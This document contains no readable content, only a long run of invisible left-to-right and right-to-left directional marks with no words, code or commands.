‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎